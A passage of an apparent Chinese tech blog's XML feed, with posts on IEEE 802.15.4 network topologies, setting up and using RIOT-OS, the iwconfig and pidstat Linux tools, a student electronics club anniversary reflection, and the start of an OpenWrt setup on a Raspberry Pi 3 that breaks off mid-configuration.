在对等拓扑中，每个设备能够与其无线电通信范围内的任何其他设备进行通信，并且可以通过多条路由将报文传递给其射频通信范围外的设备。对等网络也可以有精简功能设备，但只能作为外围设备，因为它们不具备转发数据报的功能，也因此，对等网络中必须有足够多的全功能设备来形成网络。 （1）网络建立流程 任何一个FFD使自己成为一个PAN协调器，并选择一个与其附近的其他网络不同的PAN ID，就可以建成一个新的对等网络。 网络设备按照一套规定的步骤加入到对等网络：首先，具有路由功能的设备通过发现邻近PAN协调器或者作为PAN协调器代理来扫描可用的网络。IEEE 802.15.4标准将具有路由功能的设备也认为是协调器。扫描完成后，网络设备的高层通过向PAN协调器或者最近的一个协调器发送入网请求来加入到一个被发现的网络。相应的，协调器决定是否允许网络设备入网。 如果这个网络设备是FFD，它加入网络后也可以成为一个协调器，并向其他已入网设备提供报文转发服务或者向未入网设备提供入网服务。 （2）特点 任何两个设备之间都可以通讯 网络协调器负责管理链路状态信息、认证设备身份等功能 允许多跳路由的方式传输数据 适合于设备分布范围广的应用（工业检测与控制） 簇树网络 簇树网络是对等网络拓扑结构的一种特定类型。在对等网络中的设备可以为完整功能设备，也可以为简化功能设备。 而在树簇中的大部分设备是 FFD， RFD 只能作为一个叶结点连接在树簇拓扑结构树枝的末尾处。任何一个 FFD 都可以作为主协调器，并且，为其它从设备或主设备提供同步服务。在整个 PAN 中，只要该设备相对于 PAN 中的其它设备具有更丰富的计算资源，这样的设备都可以成为该 PAN 的主协调器。 在建立一个 PAN 时，首先， PAN 主协调器将自身设置为一个簇标识符（ CID）为 0 的簇头，然后，选择一个没有使用的 PAN 标识符，并向邻近的其它设备以广播的方式发送信标帧，从而形成第一簇网络。接收到信标帧的候选设备可以在簇头中请求加入该网络，如果 PAN 主协调器允许该设备加入，那么主协调器会将该设备作为结点加入到邻近表中，成为该网络的一个从设备，同时，请求加入的设备将 PAN 协调器作为它的父结点加到邻近列表中，成为该网络的一个从设备，开始发送周期性的信标帧；其它的候选设备也可以在这台刚加入的设备上加入该网络。如果原始的候选不能加入到该网络中，那么它将寻找其它的父结点。 参考文献： [1] Gutierrez J A, Callaway E H, Barrett R L. Low-rate wireless personal area networks: enabling wireless sensors with IEEE 802.15. 4[M]. IEEE Standards Association, 2004.]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>802.15.4</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RIOT-OS开发环境搭建与样例解析]]></title>
    <url>%2F2017%2F11%2F24%2FRIOT-OS%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E6%A0%B7%E4%BE%8B%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[正式开始折腾友好的RIOT操作系统。 开发环境搭建源码下载与编译 以Ubuntu系统中搭建RIOT-OS开发环境为例，下载源码： 1$ git clone git://github.com/RIOT-OS/RIOT.git 主分支一般是稳定版，如需最新版可切换到最新的分支： 12$ cd RIOT$ checkout &lt;LATEST_RELEASE&gt; 编译： 1234$ sudo ./dist/tools/tapsetup/tapsetup # 创建虚拟以太网接口，连接多个RIOT实例 $ cd examples/default/$ make all$ make term 亲测，32位ubuntu系统可以正确执行编译，但是64位ubuntu在使用make all编译时会出错，如图： 可使用如下方法解决： 1sudo apt-get install libc6-dev-i386 完成后再编译即可。 使用make term进行本地调试时，也会出错，如图： 此时需加上sudo提升下权限： 1sudo make term 如果要编译到指定的平台，可在make时使用BOARD指定，例如： 1$ sudo make BOARD=cc2538dk 然后，使用make进行编译，会发现如下错误。 编译到cc2538dk等平台时需要下载交叉编译工具，否则会报错。根据RIOT的官方文档： https://github.com/RIOT-OS/RIOT/wiki/Family%3A-ARM ARM系列需要下载gcc-arm-embedded toolchain，地址如下：https://developer.arm.com/open-source/gnu-toolchain/gnu-rm 下载Linux64位版本，然后将其解压： 1$ tar -xjvf 下载工具包名称.tar.bz2 -C /usr/bin 将其添加到环境变量： 1$ nano ~/.bashrc 在最后添加如下一行： 1$ export PATH=/usr/bin/下载工具包名称/bin:$PATH 然后执行： 1$ source ~/.bashrc 这样即可执行编译。但是注意编译一定不要使用sudo，这样的话还是会出错，直接make就好了： 1$ make BOARD=cc2538dk 基本操作 以cc2538dk硬件平台为例： 编译生成指定硬件平台的可执行文件 123$ make BOARD=cc2538dkor$ make all BOARD=cc2538dk 将程序烧录到指定硬件平台 1$ make flash BOARD=cc2538dk 通过串口连接到硬件平台进行调试 123$ make term BOARD=cc2538dkor$ make term BOARD=cc2538dk PORT=/dev/ttyACM1 例程解析main.c12345678910111213141516#include &lt;stdio.h&gt;#include &quot;shell.h&quot;#include &quot;shell_commands.h&quot;int main(void)&#123; puts(&quot;Hello World!&quot;); printf(&quot;You are running RIOT on a(n) %s board.\n&quot;, RIOT_BOARD); printf(&quot;This board features a(n) %s MCU.\n&quot;, RIOT_MCU); char line_buf[SHELL_DEFAULT_BUFSIZE]; shell_run(NULL, line_buf, SHELL_DEFAULT_BUFSIZE); return 0;&#125; 代码风格与我们平时使用的C基本没有区别，节点启动后，RIOT会启动两个线程： idle 线程，具有最低优先级，只要没有其他线程准备运行，它将运行。它将自动使用设备的最低可能的电源模式。 main 线程，配置的默认优先级位于最低和最高可用优先级之间的中间-是运行并调用main()函数的第一个线程。 另外，它这里使用到了RIOT的shell，程序运行后可通过shell命令与程序进行交互，当然，我们这里并没有定义命令，所以如下图的运行结果中并没有命令。 Makefile 应用程序的 Makefile 至少需要定义以下宏： APPLICATION：应该包含应用程序的名称 RIOTBASE：指定RIOT存储库副本的路径 BOARD 宏也是需要的并且默认被建议设置为native，但是建议使用？=操作符来覆盖。另外，需要从 RIOTBASE 中包含Makefile.include。 12345678910111213# 应用程序的名称APPLICATION = hello-world# 定义开发板，默认是native平台，可在bashrc文件中添加，也可以在编译之前使用export BOARD=cc2538cb定义BOARD ?= native# 指定根路径，用于加载模块、驱动等，这必须是RIOT基本目录的绝对路径RIOTBASE ?= $(CURDIR)/../../RIOTinclude $(RIOTBASE)/Makefile.include# 添加模块USEMODULE += shellUSEMODULE += shell_commands 包含模块： 默认情况下，RIOT应用程序仅包含应用程序的代码本身，内核和平台特定的代码。为了使用其他模块，如特定的设备驱动程序或系统库（包括网络功能），你必须将模块的名称附加到USEMODULE变量。 123USEMODULE += sht11USEMODULE += gnrc_ipv6_defaultUSEMODULE += gnrc_udp]]></content>
      <categories>
        <category>IoT</category>
        <category>RIOT</category>
      </categories>
      <tags>
        <tag>RIOT</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开源物联网操作系统：RIOT-OS]]></title>
    <url>%2F2017%2F11%2F18%2F%E5%BC%80%E6%BA%90%E7%89%A9%E8%81%94%E7%BD%91%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%EF%BC%9ARIOT-OS%2F</url>
    <content type="text"><![CDATA[RIOT是一个开源的物联网操作系统，它针对物联网场景的低功耗、资源受限等特殊要求而设计，前景很不错。 简介 RIOT操作系统针对物联网场景的特殊要求而设计。这些要求包括低内存占用，高能效，实时功能，模块化和可配置的通信堆栈，并支持各种低功耗设备。 RIOT基于微内核架构，这意味着它针对非常低的资源需求进行了优化，并且支持实时和多线程处理。它兼容16/32位MCU架构，还有一个本机端口可用于在Linux或MacOS上作为进程运行，从而可以使用标准开发工具，如GNU编译器集合，GNU调试器，Valgrind或Wireshark 。 RIOT具有多种功能集成，支持C/C++语言，并提供shell，加密库，各种数据结构等功能。操作系统集成了对IPv6或6LoWPAN等网络堆栈的支持，以及UDP，TCP，RPL和CoAP网络协议。操作系统还具有各种硬件的驱动程序，如传感器，无线电收发器和MCU。 支持的平台 RIOT支持ARM Cortex-M0，M3，M4和ARM7架构，从而支持各种开发板，如Arduino Due，基于Atmel ATmega2560 MCU（例如Arduino Mega 2560）或蓝牙设备如北欧nRF51822 SoC。 支持的网络协议栈 RIOT不仅仅支持TCP/IP网络协议栈，还支持IPv6，6lowpan等，另外，它还通过CCN Lite提供了对CCN协议的支持。 操作系统对比 对比TinyOS、Contiki、Linux，RIOT的优势十分明显。 相关资料RIOT-OS官网：http://www.riot-os.org/ Github repository: https://github.com/RIOT-OS/RIOT CSDN博客： http://blog.csdn.net/mx1252111/article/category/6423778 论文1：Will H, Schleiser K, Schiller J. A real-time kernel for wireless sensor networks employed in rescue scenarios[C]// Local Computer Networks, 2009. LCN 2009. IEEE, Conference on. IEEE, 2009:834-841. http://ieeexplore.ieee.org/document/5355049/ 论文2：Baccelli E, Hahm O, Wählisch M, et al. RIOT: One OS to Rule Them All in the IoT[J]. HAL - INRIA, 2013. https://hal.inria.fr/hal-00768685/ 论文3：Baccelli E, Hahm O, GüNes M, et al. RIOT OS: Towards an OS for the Internet of Things[C]// Computer Communications Workshops. IEEE, 2013:79-80. http://www.riot-os.org/docs/riot-infocom2013-abstract.pdf 系统框架 RIOT的代码库分为五组。 内核 (core) 平台特定的代码 (cpu; boards) 设备驱动 (drivers) 库和网络代码 (sys; pkg) 演示功能和测试的应用程序 (examples; tests) 此外，RIOT还包括各种任务的脚本集合(dist)以及用于生成文档(soc)的预定义环境。 core core文件夹包含了RIOT的内核文件，包括线程管理，消息管理，关键数据结构，一些格式定义等。其中最关键的是，它包含了RIOT中主线程和空闲线程的创建。 board board文件夹中包含了RIOT支持的硬件平台的所有定义和实现，其中包括ARM、TI等公司的产品。通常，硬件平台由控制器的固定配置和一些外部设备（如传感器或无线电）组成。该文件夹的主要作用是把硬件平台编译需要的文件联系起来，这样硬件平台才能够编译，它包含有关GPIO引脚，MCU时钟和器件驱动程序配置的所有方面。 cpu cpu文件夹包含所有特定于CPU的源文件。在多个CPU共享相同架构的情况下，实现被分为几个CPU特定的部分和架构部分（例如arm7_common和lpc2387）。cpu这个文件夹非常重要，前期的编程会频繁的使用到这个文件夹内的文件。 drivers drivers文件夹包含特定设备的所有类型的驱动程序，比如enc28j60，dht11等，同时它还包含了硬件平台底层驱动的头文件。 sys sys是一个非常重要的文件夹，里面包含了RIOT的精华部分，我们就很少去直接使用cpu文件夹的内容，而是直接使用sys中的一些函数，因为cpu文件夹中的东西是底层的，而sys中的应用是高层的。 而sys文件夹下的net文件夹更是重中之重，这里面包含了RIOT网络部分的文件，其中包括数据链路层、网络层、传输层和应用层的。因此，我们可以找到sixlowpan，udp，rpl，border routers等功能。RIOT提供了强大的gnrc模块，在无线传输方面十分方便。 examples examples文件夹里面提供了几个经典的例程，这几个例程非常非常的重要，可以说只要掌握了这几个例程的功能，RIOT的大部分功能就学会了。只要明白了shell命令去调试之后就可以很简单的去解析这些程序了。 tests tests文件夹提供了各个功能的详细测试程序。RIOT里面包含的功能几乎都可以在这里面找到测试的实例。而且这些功能机会支持所有的硬件平台。只要按照自己选择的硬件平台去编译就能根据测试结果去辅助学习了。 pkg pkg文件夹提供了一些外部库驱动，比如libcoap、openwsn等库驱动。 dist、doc dist文件夹提供了一些工具，doc文件夹提供了一些文档。]]></content>
      <categories>
        <category>IoT</category>
        <category>RIOT</category>
      </categories>
      <tags>
        <tag>RIOT</tag>
        <tag>操作系统</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux Wireless Tools：iwconfig]]></title>
    <url>%2F2017%2F11%2F11%2FLinux-Wireless-Tools%EF%BC%9A-iwconfig%2F</url>
    <content type="text"><![CDATA[iwconfig - 配置无线网络接口 iwconfig用于Linux系统配置无线网络设备或显示无线网络设备信息。iwconfig命令类似于ifconfig命令，但是他配置对象是无线网卡，它对网络设备进行无线操作，如设置无线通信频段。 iwconfig安装 ubuntu下使用如下命令安装，wireless-tools工具包中包含了iwconfig。 1sudo apt install wireless-tools 使用说明123456789101112131415161718192021Usage: iwconfig [interface] interface essid &#123;NNN|any|on|off&#125; interface mode &#123;managed|ad-hoc|master|...&#125; interface freq N.NNN[k|M|G] interface channel N interface bit &#123;N[k|M|G]|auto|fixed&#125; interface rate &#123;N[k|M|G]|auto|fixed&#125; interface enc &#123;NNNN-NNNN|off&#125; interface key &#123;NNNN-NNNN|off&#125; interface power &#123;period N|timeout N|saving N|off&#125; interface nickname NNN interface nwid &#123;NN|on|off&#125; interface ap &#123;N|off|auto&#125; interface txpower &#123;NmW|NdBm|off|auto&#125; interface sens N interface retry &#123;limit N|lifetime N&#125; interface rts &#123;N|auto|fixed|off&#125; interface frag &#123;N|auto|fixed|off&#125; interface modulation &#123;11g|11a|CCK|OFDMg|...&#125; interface commit Check man pages for more details. essid 设置无线网卡的ESSID(Extension Service Set ID)。通过ESSID来区分不同的无线网络，正常情况下只有相同ESSID的无线站点才可以互相通讯，除非想监听无线网络。其后的参数为双引号括起的ESSID字符串，或者是any/on/off，如果ESSID字符串中包含any/no/off，则需要在前面加”–”。 123$ iwconfig eth0 essid any$ iwconfig eth0 essid &quot;My Network&quot;&quot;$ iwconfig eth0 essid -- &quot;ANY&quot;&quot; mode 设置无线网卡的工作模式，可以是 Ad-hoc：不带AP的点对点无线网络 Managed：通过多个AP组成的网络，无线设备可以在这个网络中漫游 Master：设置该无线网卡为一个AP Repeater：设置为无线网络中继设备，可以转发网络包 Secondary：设置为备份的AP/Repeater Monitor：监听模式 Auto：由无线网卡自动选择工作模式 12$ iwconfig wlan0 mode Managed$ iwconfig wlan0 mode Ad-Hoc freq/channel 设置无线网卡的工作频率或者频道，小于1000的参数被认为是频道，大于10000的参数被认为是频率。频率单位为Hz，可以在数字后面附带k, M, G来改变数量级，比如2.4G。频道从1开始。使用lwlist工具可以查看无线网卡支持的频率和频道。参数off/auto指示无线网络自动挑选频率。 注意：如果是Managed模式，AP会指示无线网卡的工作频率，因此该设置的参数会被忽略。Ad-hoc模式下只使用该设定的频率初始无线网络，如果加入已经存在的Ad-hoc网络则会忽略该设置的频率参数。 1234$ iwconfig wlan0 freq 2422000000$ iwconfig wlan0 freq 2.422G$ iwconfig wlan0 channel 3$ iwconfig wlan0 channel auto rate/bit 如果无线网卡支持多速率，则可以通过该命令设置工作的速率。小于1000的参数由具体的无线网卡驱动定义，一般是传输速率的索引值，大于1000的为速率，单位bps，可以在数字后面附带k,M,G来指定数量级。auto参数让无线网卡自动选择速率fixed参数让无线网卡不使用自动速率模式。 123iwconfig wlan0 rate 11Miwconfig wlan0 rate autoiwconfig wlan0 rate 5.5M auto ap 连接到指定的AP或者无线网络，后面的参数可以是AP的MAC地址，也可以是iwlist scan出来的标识符。如果是Ad-hoc，则连接一个已经存在的Ad-hoc网络。使用off参数让无线网卡不改变当前已连接的AP下进入自动模式。any/auto参数，无线网卡自动选择最好的AP。 注意：如果无线信号低到一定程度，无线网络会进入自动选择AP模式。 123iwconfig wlan0 ap 00:60:1D:01:23:45iwconfig wlan0 ap anyiwconfig wlan0 ap off key/enc 设置无线网卡使用的加密密钥，此处为设置WEP模式的加密key，如果要使用WPA，需要wpa_supplicant工具包。 123iwconfig wlan0 key 0123-4567-89iwconfig wlan0 key [3] 0123-4567-89iwconfig wlan0 key s:password [2] power 设置无线网卡的电源管理模式。period ‘value’ 指定唤醒的周期，timeout ‘value’指定进入休眠的等待时间，这两个参数之前可以加min和max修饰，这些值的单位为秒，可以附加m和u来指定毫秒和微秒。off/on参数指定是否允许电源管理，all/unicast/multicast 指定允许唤醒的数据包类型。 123456iwconfig wlan0 power period 2iwconfig wlan0 power 500m unicastiwconfig wlan0 power timeout 300u alliwconfig wlan0 power saving 3iwconfig wlan0 power offiwconfig wlan0 power min period 2 power max period 4 txpower 如果无线网卡支持多发射功率设定，则使用该参数设定发射，单位为dBm，如果指定为W（毫瓦），只转换公式为：dBm=30+log(W)。参数on/off可以打开和关闭发射单元，auto和fixed指定无线是否自动选择发射功率。 1234$ iwconfig wlan0 txpower 15$ iwconfig wlan0 txpower 30mW$ iwconfig wlan0 txpower auto$ iwconfig wlan0 txpower off retry 设置无线网卡的重传机制。limit ‘value’ 指定最大重传次数；lifetime ‘value’指定最长重试时间，单位为秒，可以附带m和u来指定单位为毫秒和微秒。如果无线网卡支持自动模式，则在limit和lifetime之前还可以附加min和max来指定上下限值。 1234$ iwconfig wlan0 retry 16$ iwconfig wlan0 retry lifetime 300m$ iwconfig wlan0 retry short 12$ iwconfig wlan0 retry min limit 8 commit 提交所有的参数修改给无线网卡驱动。有些无线网卡驱动会先缓存无线网卡参数修，使用这个命令来让无线网卡的参数修改生效。不过一般不需要使用该命令，因为无线网卡驱动最终都会是参数的修改生效，一般在debug时会用到。 其他配置123456- nwid: Network ID # 只用于pre-802.11的无线网卡，802.11网卡利用ESSID和AP的MAC地址来替换nwid，现在基本上不用设置。- nick: Nickname # 一些网卡需要设置该参数，但是802.11协议栈、MAC都没有用到该参数，一般也不用设置。- sens # 设置接收灵敏度的下限，在该下限之下，无线网卡认为该无线网络信号太差。- rts # 设置节点发送RTS的最小包的大小- frag # 设置发送数据包的分片大小。- modu # 设定的特定调制集]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>iwconfig</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[电协三周年分享]]></title>
    <url>%2F2017%2F11%2F11%2F%E7%94%B5%E5%8D%8F%E4%B8%89%E5%91%A8%E5%B9%B4%E5%88%86%E4%BA%AB%2F</url>
    <content type="text"><![CDATA[电子协会三周年系列专访，我的一些感想与思考，谨以此纪念电协三周年！ 忆往昔峥嵘岁月 电协三周年，很多的感慨。三年一晃而过，还记得第一届成立大会的情景，当初稚嫩的我们如今都已经毕业。从跟着12级的学长学姐学习，到我们第二届接手电子协会与实验室，再到把接力棒交给第三届，看着现在第四届朝气蓬勃的样子，我是由衷地为协会和实验室的发展感到高兴。 一年又一年，一届带一届，最重要的是精神的传承。可能每个人对这种精神的定义会不一样，但是这几年，我看到的电协人的精神是团结、互助、拼搏与创新。这是一个有活力的团队，在这里，几位优秀的指导老师带领一届届电协人一起学技术、做项目、搞创新，取得了优异的成绩。 这也是一个友爱的团队，在这里，收获的不仅仅是技术的进步与自身素质的提升，更重要的是结识了一群志同道合的朋友。虽然一起奋斗的那些日子已经一去不复返，但是我们依然铭记。当国庆期间，受邀到到深圳广州游玩，实验室几位老铁毕业以后的第一次相约。再次相聚，我们还是老样子，有说有笑，一起聊技术聊生活，一起开黑，这样真的很棒。 看今朝共铸辉煌 很荣幸这次能够和学弟一起策划这么一个系列专访，目的也是让小伙伴们对协会和实验室有更深入的了解，也希望学长学姐的一些分享能给大家带来帮助。前面的推送中，学长学姐已经给大家分享了很多使用的经验，不管是刚刚加入协会和实验室的学弟学妹，还是已经在准备找工作、考研的同学，我觉得都应该好好看看他们的经验分享，可以让你少走一些弯路。既然是系列专访，作为协会和实验室的老腊肉，那我也来分享一点自己的经验吧。 学习目标 大学，最怕没有目标。可以看到大学很多人都很迷茫，不知道前进的方向。如果你迷茫，可以与往届的学长学姐多聊聊，他们或许能够给你一些建议。当然，最关键的还是自己要去寻找目标，多去尝试，多去了解，只有这样你才知道自己以后想要做什么。当然，相信能够选择加入协会和实验室的人至少应该是有目标或者正在寻找目标的人。 学什么？协会和实验室已经有比较完善的学习体系，比如51单片机学习、PCB绘制等，这些都是必要的基础知识。除此之外，就我目前学习的经验以及我所了解的实验室的情况来看，建议大家可以学习一下嵌入式操作系统，比如嵌入式Linux、Contiki、RIOT或者华为的Lite-OS等。当然，还有著名的Linux，这是你们以后很有可能会接触到的。然后可以了解一下通信协议，比如6LoWPAN、ZigBee、NB-IoT等，这些也是做物联网相关项目的基础。另外，上次欧超学长回来提到的，大家不要总是拿着单片机闹钟、学生管理系统等这样的老掉牙的项目在做，我觉得也是很有道理的，大家在学完基础部分以后应该多了解一点新的技术，练习一些具有创新性、挑战性的项目。 学习方法 怎么学？好的学习方法往往能够使得你事半功倍。我们可以看到身边有少数同学，每天早出晚归，看似非常努力，但是效果却并不好。那如何取得更好的学习效果呢？谈一谈我认为比较重要的几点吧： 1. 广泛涉猎，善用工具。不要局限于某个很小的技术领域，而应该广泛涉猎相关的技术，其实，很多技术的都是相通的，很多思想可以互相借鉴。我在本科期间对嵌入式软件开发、安卓开发、Python编程、以及Web开发都有一定的了解，这些对我现在的研究都是很有帮助的。互联网时代，网上的工具和资源真是相当丰富了，多去CSDN、51CTO、华为等技术论坛，github等开源社区寻找你需要的工具。不要重复造轮子，多学习别人优秀的开源项目，从别人的项目中学习好的代码习惯，清晰的逻辑，高效的算法。开源在很大程度上推动着技术的进步，我们一方面可以充分利用开源项目进行学习与再创新，另一方面，也要学会分享，懂得分享，可以适当把自己的项目开源出去，让别人一起来改进。 2. 学会总结，善做笔记。做笔记其实是一个知识整理与总结的过程，当然，我说的做笔记不是一味地copy，最好的方式是用自己的话来表达。从我个人的习惯来说，我不仅使用像有道云笔记、evernote这样的工具做笔记，也时常把笔记整理后通过博客分享出去。个人认为，写博客就是一种很好的方式，不仅可以总结知识，分享知识，还可以广泛结交这个圈子里的人。技术博客不一定都是深奥的原理和技术分享，你自己学习中的一些知识点和问题的解决方法都可以记录成文章发表成博客。我是大二的时候开始写博客的，坚持了好几年，从CSDN到Wordpress再到现在的github pages，总计浏览量已达到十几万，这期间也通过博客结交了一群爱好技术的朋友，其中不乏名校的学生，也有出国留学的人。 3. 学会合作，注重交流。不要总是沉浸在自己的技术世界里面，多与别人合作，特别要注重交流，避免不必要的错误。一方面，一定要有自己的技术小团队，找几个志同道合，能够共同讨论交流，共同进步的人，平时遇到问题可以一起交流讨论，提升解决问题的效率。另一方面，尝试着通过留言、邮件等方式去与活跃于技术论坛的人交流，寻找学习与合作的机会。 行动力 最后就是靠个人的行动了，努力、坚持不懈这些词不是我应该对你们说的，而应该是你们自己去做的，如何去做到，相信你会有自己的方法。好了，巴拉巴拉说了很多了，目前只想到这些，如果有什么问题可以联系我。 另外，一个团结友爱的集体，不应该只有学习，还应该有酒有肉有故事。千万不要大学四年读完了都不知道长沙有哪些好玩的地方，有机会一起去市里浪一浪，别整天死宅死宅的，有机会也可以一起喝酒撸串，一起搞事情，一起谈人生谈理想。 望未来任重而道远 看到这几年协会与实验室的发展，每年都有很多优秀的人才，每年都能拿很多的奖励，估计所有的获奖证书连起来应该都可以绕实验室几圈了吧，哈哈哈~但是，我们应该始终保持危机感。从我了解的情况来看，学院其他协会和实验室都发展得很好，如何让电子协会和实验室取得更大的进步，面对技术的日新月异，如何抓住新机遇将实验室技术能力再提升一个档次等问题是我们都应该思考。 记得当初我做项目时使用的树莓派以及物联网云平台现在已经逐渐得到大家的认可，但是我觉得这个得到认可的周期太长了，大家应该更快的接受新的东西。就像我现在读研究生，导师都是要求我们通过一些顶级学术会议和期刊的论文来追踪学术热点，同样，大家所参加的一些开放式的竞赛也是这样，多看看别人在做什么项目，不要局限在自己的思维里，可能你觉得很好的一个想法，别人早就已经实现得很好了，所以你就不能单纯的实现别人已经实践过的项目，而应该在它的基础上思考还有什么可以改进的地方，实现再创新。总之，开阔眼界，广泛交流，这是我认为协会和实验室小伙伴可以努力的方向。 另外，有机会也可以邀请毕业的学长学姐回去分享经验，特别是在企业做嵌入式软件开发或者硬件开发的学长学姐，因为他们所做的东西更系统，更接近实际，也与大家以后的工作息息相关。希望协会和实验室能够让不同届的同学有更多沟通交流的机会，否则也就只有相近的两三届有联系了。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux进程实时监控：pidstat]]></title>
    <url>%2F2017%2F10%2F26%2FLinux%E8%BF%9B%E7%A8%8B%E5%AE%9E%E6%97%B6%E7%9B%91%E6%8E%A7%EF%BC%9Apidstat%2F</url>
    <content type="text"><![CDATA[pidstat主要用于监控全部或指定进程占用系统资源的情况，如CPU，内存、设备IO、任务切换、线程等。 pidstat安装 要使用pidstat需要安装Sysstat，它是一个工具集，包括sar、pidstat、iostat、mpstat、sadf、sadc。 1$ sudo apt-get install sysstat pidstat首次运行时显示自系统启动开始的各项统计信息，之后运行pidstat将显示自上次运行该命令以后的统计信息。用户可以通过指定统计的次数和时间来获得所需的统计信息。 基本命令 用户手册：http://sebastien.godard.pagesperso-orange.fr/man_pidstat.html 12345Usage: pidstat [ options ] [ &lt;interval&gt; [ &lt;count&gt; ] ]Options are:[ -d ] [ -h ] [ -I ] [ -l ] [ -R ] [ -r ] [ -s ] [ -t ] [ -U [ &lt;username&gt; ] ][ -u ] [ -V ] [ -v ] [ -w ] [ -C &lt;command&gt; ] [ -G &lt;process_name&gt; ][ -p &#123; &lt;pid&gt; [,...] | SELF | ALL &#125; ] [ -T &#123; TASK | CHILD | ALL &#125; ] 指定采样周期和采样次数 pidstat命令指定采样周期和采样次数，例如以2秒为采样周期，输出10次cpu使用统计信息： 1$ pidstat 2 10 -p参数1-p &#123; pid [,...] | SELF | ALL &#125; #指定进程显示其报告 选择要报告统计信息的任务（进程）。pid是进程标识号。 SELF关键字表示要为pidstat进程本身报告统计信息，而ALL关键字表示要为系统管理的所有任务报告统计信息。SELF和ALL可不指定，如下： 1$ pidstat -p 进程号 可使用以下命令获得进程号，以下命令会列出所有进程的进程号： 1$ ps -e 也可以通过top命令或者直接查看某个服务的状态得到该服务涉及的进程。 -u参数 使用-u选项，pidstat将显示各活动进程的cpu使用统计，执行”pidstat -u”与单独执行”pidstat”的效果一样。 123$ pidstator$ pidstat -u 123456789- UID # 正在监视的任务的真实用户识别号- USER # 正在监视的任务的真实用户名- PID # 被监视任务的识别号- %usr # 在用户级（应用程序）执行任务时使用的CPU的百分比，有或没有优先级。请注意，此字段不包括运行虚拟处理器的时间- %system # 在系统级别（内核）执行任务时CPU占用的百分比- %guest # 虚拟机中任务占用的CPU的百分比（运行虚拟处理器）- %CPU # 该任务使用的CPU时间的总百分比- CPU # 处理器号，任务被哪个处理器处理- Command # 任务的命令名 -r参数 使用-u选项，pidstat将显示各活动进程的页面故障和内存利用率。 1$ pidstat -r 123456789- UID # 正在监视的任务的真实用户识别号- USER # 正在监视的任务的真实用户名- PID # 被监视任务的识别号- minflt/s # 每秒次缺页错误次数(minor page faults)，次缺页错误次数意即虚拟内存地址映射成物理内存地址产生的page fault次数- majflt/s # 每秒主缺页错误次数(major page faults)，当虚拟内存地址映射成物理内存地址时，相应的page在swap中，这样的page fault为major page fault，一般在内存使用紧张时产生- VSZ # 该进程使用的虚拟内存(以kB为单位)- RSS # 该进程使用的物理内存(以kB为单位)- %MEM # 当前任务使用的有效内存的百分比- Command # 任务的命令名 -d参数 使用-d选项，pidstat将将显示各活动进程的I/O统计信息（内核2.6.20及更高版本）。 1$ pidstat -d 12345678- UID # 正在监视的任务的真实用户识别号- USER # 正在监视的任务的真实用户名- PID # 被监视任务的识别号- kB_rd/s # 每秒此进程从磁盘读取的千字节数- kB_wr/s # 此进程已经或者将要写入磁盘的每秒千字节数- kB_ccwr/s # 由任务取消的写入磁盘的千字节数- iodelay # 阻止正在监视的任务的I/O延迟，以时钟滴答测量- Command # 命令的名字 其他参数1234567-h # 显示所有的活动的任务-I # 在SMP环境，指出任务的CPU使用（等同于选项-u）应该被除于cpu的总数-l # 显示进程的命令名和它的参数-T &#123; TASK | CHILD | ALL &#125; # 指定必须监测的内容：TASK是默认的，单个任务的报告；CHILD：指定的进程和他们的子进程的全局报告，ALL：相当于TASK和CHILD-s # 堆栈的使用-t # 显示与所选任务相关的线程的统计数据-w # 报告任务切换情况 使用示例 以2秒为采样周期，输出5次进程号为1643的页面故障和内存使用统计信息。 1pidstat -r -p 1643 2 5 以2秒为采样周期，输出5次进程号为1643的页面故障和内存使用统计信息以及CPU使用率。 1pidstat -u -r -p 1643 2 10 以2秒为采样周期，输出10次系统中所有任务的子进程的页面错误统计信息。只显示具有非零统计值的子进程。 1pidstat -T CHILD -r 2 10 保存数据 重定向输出即可，例如，每隔两秒记录1次，一共10次，并输出到data.txt文件 1$ pidstat 2 10 &gt; data.txt]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>pidstat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raspberry pi 3刷OpenWrt打造无线路由器]]></title>
    <url>%2F2017%2F10%2F18%2FRaspberry-pi-3%E5%88%B7OpenWrt%E6%89%93%E9%80%A0%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[OpenWrt在Raspberry pi 3上的安装与初步配置记录。 烧写Openwrt系统 下载支持Raspberry Pi 3代的LEDE（Openwrt的一个分支）镜像， LEDE官方网站：https://lede-project.org/ Raspbery Pi 3 LEDE镜像下载地址：http://downloads.lede-project.org/snapshots/targets/brcm2708/bcm2710/lede-brcm2708-bcm2710-rpi-3-ext4-sdcard.img.gz 使用Win32DiskImager工具将下载的镜像文件写入到SD卡中，然后连接显示器键盘即可进入系统进行相关操作。 Raspbery Pi 3连接显示器后无显示的问题： 修改系统/boot/comfig.txt文件，默认的HDMI输出都配置为不开启，所以需要配置HDMI输出为如下： 123456789hdmi_safe=1overscan_left=-30overscan_right=-30overscan_top=-30overscan_bottom=-30hdmi_group=2hdmi_mode=4hdmi_drive=2config_hdmi_boost=4 配置Openwrt 配置Openwrt有线网络，修改/etc/config/network文件，配置wan口和lan口如下： 1234567891011config interface &apos;lan&apos; option type &apos;bridge&apos; option proto &apos;static&apos; option ipaddr &apos;192.168.3.1&apos; option netmask &apos;255.255.255.0&apos; option ip6assign &apos;60&apos; option gateway &apos;192.168.3.1&apos;config interface &apos;wan&apos; option proto &apos;dhcp&apos; option ifname &apos;eth0&apos; 配置Openwrt无线网络，修改/etc/config/wireless文件，配置wlan0的模式、ssid、key等信息，如下： 1234567config wifi-iface option device &apos;radio0&apos; option network &apos;lan&apos; option mode &apos;ap&apos; option ssid 